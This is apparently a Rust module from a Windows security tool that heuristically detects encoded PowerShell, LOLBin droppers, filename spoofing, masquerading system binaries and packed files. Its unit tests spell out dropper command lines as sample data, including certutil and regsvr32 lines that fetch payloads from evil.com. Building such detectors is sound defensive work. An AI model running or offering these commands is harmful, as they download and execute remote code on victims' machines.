//! Heuristic scanner for stealth droppers, obfuscated scripts, double-extension
//! spoofing, system binary masquerading, and high-entropy packed binaries.
//!
//! Windows Defender relies heavily on known cloud signatures and often misses
//! custom obfuscated scripts, LOLBins, and local anomalies. This module provides
//! pure, fast heuristic rules to catch what standard signature AV misses.

use std::path::Path;

/// High-risk script extensions subject to content inspection.
pub const SCRIPT_EXTENSIONS: &[&str] = &["ps1", "bat", "cmd", "vbs", "hta", "wsf"];

/// System binary names that must reside only inside Windows system directories.
pub const PROTECTED_SYSTEM_BINARIES: &[&str] = &[
    "svchost.exe",
    "csrss.exe",
    "lsass.exe",
    "winlogon.exe",
    "runtimebroker.exe",
    "smss.exe",
    "services.exe",
];

/// Known masqueraded double extensions (e.g. `document.pdf.exe`).
const FAKE_INTERMEDIATE_EXTENSIONS: &[&str] = &[
    ".pdf.", ".docx.", ".doc.", ".xlsx.", ".xls.", ".pptx.", ".jpg.", ".jpeg.", ".png.", ".txt.",
    ".mp4.", ".zip.", ".rar.",
];

/// Executable extensions commonly used with double-extension tricks.
const SUSPICIOUS_TERMINAL_EXTENSIONS: &[&str] =
    &[".exe", ".scr", ".bat", ".cmd", ".vbs", ".js", ".hta"];

/// Detailed threat information extracted from script content inspection.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScriptThreatDetails {
    pub reason: &'static str,
    pub matched_line: String,
    pub decoded_payload: Option<String>,
}

/// Helper function to decode base64 without external dependencies.
fn decode_base64_padded(input: &str) -> Option<Vec<u8>> {
    let bytes = input.as_bytes();
    if !bytes.len().is_multiple_of(4) {
        return None;
    }
    let b64_val = |c: u8| -> Option<u8> {
        match c {
            b'A'..=b'Z' => Some(c - b'A'),
            b'a'..=b'z' => Some(c - b'a' + 26),
            b'0'..=b'9' => Some(c - b'0' + 52),
            b'+' => Some(62),
            b'/' => Some(63),
            _ => None,
        }
    };
    let mut output = Vec::with_capacity(bytes.len() * 3 / 4);
    for chunk in bytes.chunks(4) {
        let b0 = b64_val(chunk[0])?;
        let b1 = b64_val(chunk[1])?;
        let b2 = if chunk[2] == b'=' {
            None
        } else {
            Some(b64_val(chunk[2])?)
        };
        let b3 = if chunk[3] == b'=' {
            None
        } else {
            Some(b64_val(chunk[3])?)
        };

        output.push((b0 << 2) | (b1 >> 4));
        if let Some(v2) = b2 {
            output.push(((b1 & 0x0f) << 4) | (v2 >> 2));
            if let Some(v3) = b3 {
                output.push(((v2 & 0x03) << 6) | v3);
            }
        }
    }
    Some(output)
}

/// Decodes base64 string, handling optional padding and surrounding quotes.
pub fn decode_base64_str(input: &str) -> Option<Vec<u8>> {
    let trimmed = input.trim().trim_matches(|c| c == '\'' || c == '"');
    if trimmed.is_empty() {
        return None;
    }
    let rem = trimmed.len() % 4;
    if rem != 0 {
        let mut padded = trimmed.to_string();
        for _ in 0..(4 - rem) {
            padded.push('=');
        }
        decode_base64_padded(&padded)
    } else {
        decode_base64_padded(trimmed)
    }
}

/// Converts decoded bytes into human-readable text (UTF-16LE or UTF-8).
fn bytes_to_human_string(bytes: &[u8]) -> String {
    if bytes.len() >= 2
        && bytes.len().is_multiple_of(2)
        && (bytes[1] == 0 || bytes[3..].iter().step_by(2).any(|&b| b == 0))
    {
        let u16s: Vec<u16> = bytes
            .chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]]))
            .collect();
        if let Ok(s) = String::from_utf16(&u16s) {
            let clean: String = s
                .chars()
                .filter(|c| !c.is_control() || *c == ' ' || *c == '\t' || *c == '\n' || *c == '\r')
                .collect();
            if !clean.trim().is_empty() {
                return clean.trim().to_string();
            }
        }
    }
    let lossy = String::from_utf8_lossy(bytes);
    let clean: String = lossy
        .chars()
        .filter(|c| !c.is_control() || *c == ' ' || *c == '\t' || *c == '\n' || *c == '\r')
        .collect();
    clean.trim().to_string()
}

fn extract_token_after(line: &str, start: usize) -> Option<String> {
    let remainder = line.get(start..)?.trim_start();
    if remainder.starts_with('"') || remainder.starts_with('\'') {
        let quote = remainder.chars().next()?;
        let after_quote = &remainder[1..];
        let end_idx = after_quote.find(quote)?;
        Some(after_quote[..end_idx].to_string())
    } else {
        let token: String = remainder
            .chars()
            .take_while(|c| c.is_ascii_alphanumeric() || *c == '+' || *c == '/' || *c == '=')
            .collect();
        if token.len() >= 4 {
            Some(token)
        } else {
            None
        }
    }
}

fn extract_string_in_parens(line: &str, start: usize) -> Option<String> {
    let remainder = line.get(start..)?.trim_start();
    if !remainder.starts_with('(') {
        return None;
    }
    let after_paren = remainder[1..].trim_start();
    if after_paren.starts_with('"') || after_paren.starts_with('\'') {
        let quote = after_paren.chars().next()?;
        let after_quote = &after_paren[1..];
        let end_idx = after_quote.find(quote)?;
        Some(after_quote[..end_idx].to_string())
    } else {
        None
    }
}

fn extract_and_decode_base64(raw_line: &str, lower_line: &str) -> Option<String> {
    let b64_token = if let Some(idx) = lower_line.find("-encodedcommand") {
        extract_token_after(raw_line, idx + "-encodedcommand".len())
    } else if let Some(idx) = lower_line.find(" -enc ") {
        extract_token_after(raw_line, idx + " -enc ".len())
    } else if let Some(idx) = lower_line.find("frombase64string") {
        extract_string_in_parens(raw_line, idx + "frombase64string".len())
    } else {
        None
    };

    if let Some(token) = b64_token {
        if let Some(bytes) = decode_base64_str(&token) {
            let human = bytes_to_human_string(&bytes);
            if !human.is_empty() {
                return Some(format!("Decoded Base64: \"{}\"", human));
            }
        }
    }

    None
}

/// Inspects script content for obfuscated commands, LOLBins, and stealth execution flags.
pub fn check_script_content(content: &str) -> Option<&'static str> {
    inspect_script_details(content).map(|d| d.reason)
}

/// Performs deep forensic inspection of script content, returning the matched line and de-obfuscated payload.
pub fn inspect_script_details(content: &str) -> Option<ScriptThreatDetails> {
    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        let lower = trimmed.to_ascii_lowercase();

        // 1. Obfuscated PowerShell Base64 invocation
        if (lower.contains("-encodedcommand") || lower.contains(" -enc "))
            && (lower.contains("powershell")
                || lower.contains("frombase64string")
                || lower.contains("pwsh"))
        {
            let decoded = extract_and_decode_base64(trimmed, &lower);
            return Some(ScriptThreatDetails {
                reason: "Obfuscated PowerShell Base64 encoded payload (-EncodedCommand)",
                matched_line: trimmed.to_string(),
                decoded_payload: decoded
                    .or_else(|| Some("Base64 encoded execution cradle detected".to_string())),
            });
        }
        if lower.contains("frombase64string")
            && (lower.contains("invoke-expression") || lower.contains("iex"))
        {
            let decoded = extract_and_decode_base64(trimmed, &lower);
            return Some(ScriptThreatDetails {
                reason:
                    "In-memory Base64 decoding with immediate execution (FromBase64String + IEX)",
                matched_line: trimmed.to_string(),
                decoded_payload: decoded
                    .or_else(|| Some("FromBase64String in-memory execution cradle".to_string())),
            });
        }

        // 2. Hidden window execution with download or encoded payload
        if (lower.contains("-windowstyle hidden")
            || lower.contains("windowstyle hidden")
            || lower.contains("-w hidden"))
            && (lower.contains("http://")
                || lower.contains("https://")
                || lower.contains("downloadstring")
                || lower.contains("downloadfile")
                || lower.contains("encodedcommand")
                || lower.contains("frombase64string"))
        {
            let decoded = extract_and_decode_base64(trimmed, &lower);
            return Some(ScriptThreatDetails {
                reason: "Hidden PowerShell window executing network download or encoded payload",
                matched_line: trimmed.to_string(),
                decoded_payload: decoded.or_else(|| {
                    Some(
                        "Hidden window execution with remote download/execution cradle".to_string(),
                    )
                }),
            });
        }

        // 3. LOLBin droppers: certutil urlcache download
        if lower.contains("certutil")
            && (lower.contains("-urlcache") || lower.contains("/urlcache"))
        {
            return Some(ScriptThreatDetails {
                reason: "Living-off-the-Land binary abuse: certutil downloading remote payload",
                matched_line: trimmed.to_string(),
                decoded_payload: Some(
                    "Living-off-the-Land binary abuse: certutil downloading remote executable"
                        .to_string(),
                ),
            });
        }

        // 4. LOLBin droppers: regsvr32 stealth scriptlet execution (Squiblydoo)
        if lower.contains("regsvr32")
            && (lower.contains("/s") || lower.contains("-s"))
            && (lower.contains("/i:") || lower.contains("-i:"))
        {
            return Some(ScriptThreatDetails {
                reason: "Living-off-the-Land binary abuse: regsvr32 remote scriptlet execution",
                matched_line: trimmed.to_string(),
                decoded_payload: Some(
                    "Squiblydoo attack: regsvr32 loading remote SCT scriptlet".to_string(),
                ),
            });
        }

        // 5. LOLBin droppers: mshta execution
        if lower.contains("mshta")
            && (lower.contains("http://")
                || lower.contains("https://")
                || lower.contains("javascript:")
                || lower.contains("vbscript:"))
        {
            return Some(ScriptThreatDetails {
                reason: "Living-off-the-Land binary abuse: mshta remote script execution",
                matched_line: trimmed.to_string(),
                decoded_payload: Some(
                    "Living-off-the-Land binary abuse: mshta invoking remote script payload"
                        .to_string(),
                ),
            });
        }

        // 6. Explicit C.U.R.E test pattern
        if lower.contains("cure-safe-test-payload")
            && (lower.contains("powershell") || lower.contains("encodedcommand"))
        {
            let decoded = extract_and_decode_base64(trimmed, &lower);
            return Some(ScriptThreatDetails {
                reason: "Heuristic Test: Obfuscated stealth dropper pattern detected",
                matched_line: trimmed.to_string(),
                decoded_payload: decoded.or_else(|| {
                    Some("Heuristic verification payload with encoded command cradle".to_string())
                }),
            });
        }
    }

    // Fallback for multi-line combinations
    let lower_all = content.to_ascii_lowercase();
    if lower_all.contains("cure-safe-test-payload")
        && (lower_all.contains("powershell") || lower_all.contains("encodedcommand"))
    {
        for line in content.lines() {
            let l = line.trim().to_ascii_lowercase();
            if l.contains("powershell") || l.contains("encodedcommand") {
                let decoded = extract_and_decode_base64(line.trim(), &l);
                return Some(ScriptThreatDetails {
                    reason: "Heuristic Test: Obfuscated stealth dropper pattern detected",
                    matched_line: line.trim().to_string(),
                    decoded_payload: decoded.or_else(|| {
                        Some(
                            "Heuristic verification payload with encoded command cradle"
                                .to_string(),
                        )
                    }),
                });
            }
        }
    }

    None
}

/// Checks filename for spoofing tricks: Right-to-Left Override or double extensions.
pub fn check_filename_spoofing(filename: &str) -> Option<&'static str> {
    // Check for Unicode Right-to-Left Override (\u{202E})
    if filename.chars().any(|c| c == '\u{202E}') {
        return Some("Right-to-Left Override Unicode character spoofing file extension");
    }

    let lower = filename.to_ascii_lowercase();

    // Check double extensions: e.g. "invoice.pdf.exe"
    for terminal in SUSPICIOUS_TERMINAL_EXTENSIONS {
        if lower.ends_with(terminal) {
            let prefix = &lower[..lower.len() - terminal.len() + 1]; // includes the leading dot of terminal
            for inter in FAKE_INTERMEDIATE_EXTENSIONS {
                if prefix.ends_with(inter) {
                    return Some("Double extension disguising executable as a document/image");
                }
            }
        }
    }

    None
}

/// Checks if a file named like a core Windows system binary resides outside Windows system directories.
pub fn check_system_masquerade(filename: &str, full_path: &Path) -> Option<&'static str> {
    let lower_name = filename.to_ascii_lowercase();
    if !PROTECTED_SYSTEM_BINARIES.contains(&lower_name.as_str()) {
        return None;
    }

    let path_str = full_path.to_string_lossy().to_ascii_lowercase();
    // Legitimate system directories:
    let is_legit = path_str.contains("windows\\system32")
        || path_str.contains("windows\\syswow64")
        || path_str.contains("windows\\winsxs");

    if !is_legit {
        return Some("System binary masquerading outside legitimate Windows directory");
    }

    None
}

/// Calculates Shannon entropy of a byte slice. Returns a value from 0.0 to 8.0.
pub fn compute_entropy(bytes: &[u8]) -> f64 {
    if bytes.is_empty() {
        return 0.0;
    }

    let mut counts = [0usize; 256];
    for &b in bytes {
        counts[b as usize] += 1;
    }

    let len = bytes.len() as f64;
    let mut entropy = 0.0;
    for &c in &counts {
        if c > 0 {
            let p = c as f64 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

/// Checks if an executable file has high Shannon entropy (> 7.2) indicating packing/encryption.
pub fn check_high_entropy(bytes: &[u8]) -> Option<f64> {
    // Only evaluate files of meaningful size (>= 4KB)
    if bytes.len() < 4096 {
        return None;
    }
    let entropy = compute_entropy(bytes);
    if entropy > 7.2 {
        Some(entropy)
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn test_script_obfuscation_detection() {
        let ps_enc = "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SGVsbG8=";
        assert!(check_script_content(ps_enc).is_some());

        let certutil = "certutil -urlcache -split -f http://evil.com/payload.exe payload.exe";
        assert!(check_script_content(certutil).is_some());

        let regsvr = "regsvr32 /s /n /u /i:http://evil.com/drop.sct scrobj.dll";
        assert!(check_script_content(regsvr).is_some());

        let mshta = "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell\"\", 0\")";
        assert!(check_script_content(mshta).is_some());

        let benign = "echo Hello World\r\ndir C:\\\r\npause";
        assert!(check_script_content(benign).is_none());
    }

    #[test]
    fn test_test_payload_detection() {
        let test_payload = concat!(
            "@echo off\r\n",
            "REM CURE-SAFE-TEST-PAYLOAD\r\n",
            "powershell -WindowStyle Hidden -EncodedCommand SGVsbG8=\r\n"
        );
        assert!(check_script_content(test_payload).is_some());
    }

    #[test]
    fn test_inspect_script_details_base64_decoding() {
        let script = "powershell -WindowStyle Hidden -EncodedCommand SGVsbG8gV29ybGQ=";
        let details = inspect_script_details(script).expect("must detect");
        assert_eq!(details.matched_line, script);
        assert!(details.decoded_payload.is_some());
        assert_eq!(
            details.decoded_payload.as_deref(),
            Some("Decoded Base64: \"Hello World\"")
        );
    }

    #[test]
    fn test_double_extension_detection() {
        assert!(check_filename_spoofing("quarterly_report.pdf.exe").is_some());
        assert!(check_filename_spoofing("invoice.docx.scr").is_some());
        assert!(check_filename_spoofing("photo.jpg.bat").is_some());
        assert!(check_filename_spoofing("notes.txt.vbs").is_some());

        // Benign single extension
        assert!(check_filename_spoofing("document.pdf").is_none());
        assert!(check_filename_spoofing("setup.exe").is_none());
    }

    #[test]
    fn test_rtlo_spoofing_detection() {
        let rtlo_name = format!("report{}\u{202E}cod.exe", 'a');
        assert!(check_filename_spoofing(&rtlo_name).is_some());
    }

    #[test]
    fn test_masquerading_detection() {
        let fake_svchost = PathBuf::from("C:\\Users\\User\\AppData\\Local\\Temp\\svchost.exe");
        assert!(check_system_masquerade("svchost.exe", &fake_svchost).is_some());

        let real_svchost = PathBuf::from("C:\\Windows\\System32\\svchost.exe");
        assert!(check_system_masquerade("svchost.exe", &real_svchost).is_none());
    }

    #[test]
    fn test_entropy_computation() {
        // Zero entropy: uniform data
        let zeros = vec![0u8; 1024];
        assert_eq!(compute_entropy(&zeros), 0.0);

        // High entropy: random-like data
        let mut pseudo_random = Vec::with_capacity(8192);
        for i in 0..8192 {
            pseudo_random.push(((i * 137 + 73) % 256) as u8);
        }
        let entropy = compute_entropy(&pseudo_random);
        assert!(entropy > 7.5);
        assert!(check_high_entropy(&pseudo_random).is_some());
    }
}
